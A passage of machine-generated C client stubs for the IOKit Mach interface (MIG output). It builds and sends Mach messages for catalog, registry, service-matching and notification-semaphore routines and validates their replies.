	if (Out0P->Head.msgh_id != 2940) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__io_catalog_module_loaded_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_catalog_module_loaded */
mig_external kern_return_t io_catalog_module_loaded
(
	mach_port_t master_port,
	io_name_t name
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t nameCnt;
		char name[128];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_catalog_module_loaded_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_catalog_module_loaded_t__defined */

	__DeclareSendRpc(2840, "io_catalog_module_loaded")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->nameCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->name, name, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->nameCnt = (mach_msg_type_number_t) mig_strncpy(InP->name, name, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->nameOffset = 0;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 128) + (_WALIGN_(InP->nameCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2840;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2840, "io_catalog_module_loaded")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2840, "io_catalog_module_loaded")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_catalog_module_loaded_t__defined)
	check_result = __MIG_check__Reply__io_catalog_module_loaded_t((__Reply__io_catalog_module_loaded_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_catalog_module_loaded_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_catalog_reset_t__defined)
#define __MIG_check__Reply__io_catalog_reset_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_catalog_reset_t(__Reply__io_catalog_reset_t *Out0P)
{

	typedef __Reply__io_catalog_reset_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 2941) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__io_catalog_reset_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_catalog_reset */
mig_external kern_return_t io_catalog_reset
(
	mach_port_t master_port,
	uint32_t flag
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		uint32_t flag;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_catalog_reset_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_catalog_reset_t__defined */

	__DeclareSendRpc(2841, "io_catalog_reset")

	InP->NDR = NDR_record;

	InP->flag = flag;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2841;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2841, "io_catalog_reset")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2841, "io_catalog_reset")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_catalog_reset_t__defined)
	check_result = __MIG_check__Reply__io_catalog_reset_t((__Reply__io_catalog_reset_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_catalog_reset_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_request_probe_t__defined)
#define __MIG_check__Reply__io_service_request_probe_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_request_probe_t(__Reply__io_service_request_probe_t *Out0P)
{

	typedef __Reply__io_service_request_probe_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 2942) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__io_service_request_probe_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_request_probe */
mig_external kern_return_t io_service_request_probe
(
	mach_port_t service,
	uint32_t options
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		uint32_t options;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_service_request_probe_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_request_probe_t__defined */

	__DeclareSendRpc(2842, "io_service_request_probe")

	InP->NDR = NDR_record;

	InP->options = options;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = service;
	InP->Head.msgh_id = 2842;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2842, "io_service_request_probe")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2842, "io_service_request_probe")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_request_probe_t__defined)
	check_result = __MIG_check__Reply__io_service_request_probe_t((__Reply__io_service_request_probe_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_request_probe_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_get_name_in_plane_t__defined)
#define __MIG_check__Reply__io_registry_entry_get_name_in_plane_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_get_name_in_plane_t(__Reply__io_registry_entry_get_name_in_plane_t *Out0P)
{

	typedef __Reply__io_registry_entry_get_name_in_plane_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */

	if (Out0P->Head.msgh_id != 2943) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 128)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if ( Out0P->nameCnt > 128 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 128))< Out0P->nameCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 128) + _WALIGN_(Out0P->nameCnt)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_get_name_in_plane_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_get_name_in_plane */
mig_external kern_return_t io_registry_entry_get_name_in_plane
(
	mach_port_t registry_entry,
	io_name_t plane,
	io_name_t name
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t nameCnt;
		char name[128];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t nameCnt;
		char name[128];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_registry_entry_get_name_in_plane_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_get_name_in_plane_t__defined */

	__DeclareSendRpc(2843, "io_registry_entry_get_name_in_plane")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->plane, plane, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy(InP->plane, plane, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->planeOffset = 0;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 128) + (_WALIGN_(InP->planeCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = registry_entry;
	InP->Head.msgh_id = 2843;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2843, "io_registry_entry_get_name_in_plane")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2843, "io_registry_entry_get_name_in_plane")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_get_name_in_plane_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_get_name_in_plane_t((__Reply__io_registry_entry_get_name_in_plane_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_get_name_in_plane_t__defined) */

	(void) mig_strncpy(name, Out0P->name, 128);

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_match_property_table_t__defined)
#define __MIG_check__Reply__io_service_match_property_table_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_match_property_table_t(__Reply__io_service_match_property_table_t *Out0P)
{

	typedef __Reply__io_service_match_property_table_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2944) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_service_match_property_table_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_match_property_table */
mig_external kern_return_t io_service_match_property_table
(
	mach_port_t service,
	io_string_t matching,
	boolean_t *matches
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t matchingOffset; /* MiG doesn't use it */
		mach_msg_type_number_t matchingCnt;
		char matching[512];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		boolean_t matches;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		boolean_t matches;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_service_match_property_table_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_match_property_table_t__defined */

	__DeclareSendRpc(2844, "io_service_match_property_table")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->matchingCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->matching, matching, 512);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->matchingCnt = (mach_msg_type_number_t) mig_strncpy(InP->matching, matching, 512);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->matchingOffset = 0;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 512) + (_WALIGN_(InP->matchingCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = service;
	InP->Head.msgh_id = 2844;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2844, "io_service_match_property_table")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2844, "io_service_match_property_table")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_match_property_table_t__defined)
	check_result = __MIG_check__Reply__io_service_match_property_table_t((__Reply__io_service_match_property_table_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_match_property_table_t__defined) */

	*matches = Out0P->matches;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_connect_get_notification_semaphore_t__defined)
#define __MIG_check__Reply__io_connect_get_notification_semaphore_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_connect_get_notification_semaphore_t(__Reply__io_connect_get_notification_semaphore_t *Out0P)
{

	typedef __Reply__io_connect_get_notification_semaphore_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2952) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->semaphore.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->semaphore.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_connect_get_notification_semaphore_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_connect_get_notification_semaphore */
mig_external kern_return_t io_connect_get_notification_semaphore
(
	mach_port_t connection,
	natural_t notification_type,
	semaphore_t *semaphore
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		natural_t notification_type;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t semaphore;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t semaphore;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_connect_get_notification_semaphore_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_connect_get_notification_semaphore_t__defined */

	__DeclareSendRpc(2852, "io_connect_get_notification_semaphore")

	InP->NDR = NDR_record;

	InP->notification_type = notification_type;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = connection;
	InP->Head.msgh_id = 2852;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2852, "io_connect_get_notification_semaphore")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2852, "io_connect_get_notification_semaphore")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_connect_get_notification_semaphore_t__defined)
	check_result = __MIG_check__Reply__io_connect_get_notification_semaphore_t((__Reply__io_connect_get_notification_semaphore_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_connect_get_notification_semaphore_t__defined) */

	*semaphore = Out0P->semaphore.name;
	return KERN_SUCCESS;
}

